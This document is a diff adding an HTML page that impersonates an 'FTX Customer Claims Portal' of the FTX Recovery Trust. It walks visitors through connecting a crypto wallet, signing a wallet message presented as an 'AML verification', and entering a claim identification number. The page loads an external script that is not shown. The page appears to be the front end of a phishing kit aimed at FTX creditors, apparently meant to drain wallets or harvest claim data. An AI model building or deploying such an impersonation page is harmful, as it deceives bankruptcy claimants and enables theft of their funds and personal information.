@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FTX Customer Claims Portal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'ftx-bg': '#0e121b',
+            'ftx-card': '#1c1f2a',
+            'ftx-blue': '#00bcd4',
+            'ftx-text': '#f4f6fb',
+            'ftx-gray': '#9ca3af',
+            'ftx-border': '#2d323e',
+            'ftx-footer': '#151a22'
+          },
+          fontFamily: {
+            'sans': ['Inter', 'Segoe UI', 'system-ui', 'sans-serif']
+          }
+        }
+      }
+    }
+  </script>
+</head>
+
+<body class="bg-ftx-bg text-ftx-text font-sans">
+  <div class="max-w-lg mx-auto">
+    <!-- Header -->
+    <header class="flex justify-between items-center border-b border-ftx-border px-4 h-15 py-4">
+      <div class="flex items-center">
+        <img src="images/logo.png?height=40&width=120&text=FTX+RECOVERY+TRUST" alt="FTX Recovery Trust" class="h-7"/>
+      </div>
+      <div class="w-6 h-6 cursor-pointer">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="text-ftx-text">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </div>
+    </header>
+
+    <div class="px-10 py-10">
+      <!-- Intro -->
+      <div class="mb-6">
+        <h1 class="text-3xl font-semibold mb-2">Welcome to the FTX Customer Claims Portal</h1>
+        <p class="text-base text-gray-400 md:w-3/4 mb-4">
+          This portal allows FTX customers to validate accounts, connect wallets, and complete steps needed for claim distribution.
+        </p>
+        <div class="text-ftx-text text-base font-medium">
+          Begin your recovery process below.
+        </div>
+      </div>
+
+      <!-- Step 1 to 4 -->
+      <div class="space-y-4">
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">1</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 1</div>
+          <h3 class="text-xl font-medium mb-3">Verify Identity</h3>
+          <p class="text-sm text-gray-400">Use your unique FTX number (from your email) to begin identity verification on the <a href="javascript:void(0)" onclick="window.scrollTo({top:document.body.scrollHeight, behavior:'smooth'})" class="text-ftx-blue font-semibold">
+  FTX Claims Portal</a>.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">2</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 2</div>
+          <h3 class="text-xl font-medium mb-3">Choose Payout Wallet</h3>
+          <p class="text-sm text-gray-400">After identity verification, select your preferred crypto wallet for receiving future distributions.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">3</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 3</div>
+          <h3 class="text-xl font-medium mb-3">Connect Wallet</h3>
+          <p class="text-sm text-gray-400">Securely connect the selected wallet to the portal to authorize future steps.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">4</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 4</div>
+          <h3 class="text-xl font-medium mb-3">AML Verification</h3>
+          <p class="text-sm text-gray-400">Sign a wallet message to complete the required Anti-Money Laundering check.</p>
+        </div>
+
+        <!-- Step 5 to 9 -->
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">5</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 5</div>
+          <h3 class="text-xl font-medium mb-3">Submit Proof of Claim</h3>
+          <p class="text-sm text-gray-400">With identity and wallet verified, submit your official claim through the portal.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">6</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 6</div>
+          <h3 class="text-xl font-medium mb-3">Confirm Submission</h3>
+          <p class="text-sm text-gray-400">Review the information you submitted to ensure all records are accurate.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">7</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 7</div>
+          <h3 class="text-xl font-medium mb-3">Tax Documentation</h3>
+          <p class="text-sm text-gray-400">Depending on your country, tax forms may be required (W-9, W-8BEN, etc.) before distribution.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">8</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 8</div>
+          <h3 class="text-xl font-medium mb-3">Set Distribution Preferences</h3>
+          <p class="text-sm text-gray-400">Choose your method of distribution—crypto wallet or other eligible method once compliance is verified.</p>
+        </div>
+
+        <div class="bg-ftx-card p-5 rounded-lg shadow-sm">
+          <div class="h-8 w-8 flex items-center justify-center bg-ftx-bg border-2 border-ftx-blue rounded-full text-ftx-blue font-bold mb-4">9</div>
+          <div class="text-xs text-gray-400 mb-2">STEP 9</div>
+          <h3 class="text-xl font-medium mb-3">Track Claim Status</h3>
+          <p class="text-sm text-gray-400">Use the dashboard to monitor your claim progress and scheduled distributions.<br/>This Consent to Process Personal Data (the "Consent") applies to FTX Trading Ltd. and the FTX Recovery Trust (and any of their successors), as defined under applicable laws ("FTX").</p>
+      </div>
+      <!-- Platform Selection -->
+      	<div class="p-2 rounded-lg shadow-sm">    	               
+  <h3 class="text-xl font-medium mb-2">Verify your identity</h3>
+  <p class="text-md text-gray-400">Use your 16-digits Claim Identification Number: </p>
+  <!-- Input -->
+  <div class="mt-4 mb-1">
+    <input
+      id="uniqueIdInput"
+      maxlength="19"
+      placeholder="xxxx-xxxx-xxxx-xxxx"
+      class="w-full bg-ftx-card border border-ftx-border rounded-md py-3 px-4 text-ftx-text text-md appearance-none flex-justify-center"
+    >
+  </div>
+  </div>
+
+  <!-- Button -->
+  <button
+    id="verifyBtn"
+    class="w-full bg-ftx-blue text-white py-3 rounded-lg font-medium uppercase text-sm hover:bg-cyan-400 transition"
+  >
+    Verify
+  </button>
+
+  <!-- Inline Result/Error Message -->
+  <div id="verificationResult" class="text-sm mt-3"></div>
+
+  <!-- Verified Success Message -->
+  <div
+    id="verificationSuccess"
+    class="hidden flex items-center space-x-2 mt-6 bg-green-600 bg-opacity-20 border border-green-500 rounded-md px-4 py-3 text-green-400 text-sm"
+  >
+    <svg class="w-5 h-5 text-green-400"  fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+    </svg>
+    <span>Your unique ID has been verified successfully!</span>
+  </div>
+  </div>
+</div>
+  <script src="js/script.js" type="text/javascript" deffer></script>
+</body>
+</html>
